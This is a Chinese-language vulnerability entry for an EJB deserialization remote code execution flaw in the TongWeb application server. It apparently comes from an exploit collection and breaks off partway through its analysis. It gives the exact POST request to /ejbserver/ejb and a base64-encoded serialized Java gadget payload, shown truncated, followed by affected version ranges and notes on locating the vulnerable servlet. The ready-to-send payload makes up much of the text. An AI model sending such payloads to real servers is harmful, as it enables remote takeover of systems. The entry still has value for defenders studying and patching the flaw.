# 东方通TongWeb应用服务器EJB反序列化远程代码执行漏洞分析

- **系统**：东方通TongWeb应用服务器EJB反序列化远程代码执行漏洞分析　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /ejbserver/ejb HTTP/1.1`
- **关键头**：`Content-Type: application/octet-stream`

**请求体 / payload**
```
{{base64decode(VzNFUC8zLjCs7QAFdwEYc3IAE2phdmEudXRpbC5IYXNodGFibGUTuw8lIUrkuAMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAAAnNyAC1qYXZheC5zd2luZy5VSURlZmF1bHRzJFRleHRBbmRNbmVtb25pY0hhc2hNYXC98e1SrfvKFAIAAHhyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP4AAAAAAAAx3CAAAABAAAAABc3IAMmNvbS50b25nd2ViLnRvbmdlamIuY2xpZW50LkpORElDb250ZXh0JExhenlCaW5kaW5nAAAAAAAAAAECAAJMAAdjb250ZXh0dAAWTGphdmF4L25hbWluZy9Db250ZXh0O0wABmZhaWxlZHQAHExqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbjt4cgAUamF2YXgubmFtaW5nLkJpbmRpbmd6qzXLtfEvAgIAAUwACGJvdW5kT2JqdAASTGphdmEvbGFuZy9PYmplY3Q7e…（脚本共 6336 字，完整版见原文）
```

**其他**
- 漏洞分析: TongWeb 默认开放EJB 远程服务 ，在处理EJB协议数据时进行了反序列化操作且未进行任何数据检测，攻击者可构造恶意序列化数据发送到EJB 服务造成远程代码执行。
影响版本为：
7.0.0.0 < =TongWeb < =7.0.4.9_M9
6.1.7.0 < =TongWeb < =6.1.8.13
通过下载官方补丁阅读补丁升级说明可知存在反序列化的接口为ejbserver/ejb
将TongWeb 的 jar 包全部导入jadx 进行搜索，先搜索ejbserver 发现结果有点多
于是转为搜索"/ejb"
只有一个结果，查看其代码实现
添加了一个mapping 路由为/ejb context 为/ejbserver
/ejb 路由对应的Servlet 为com.tongweb.tongejb.server.[httpd.ServerServlet](https://httpd.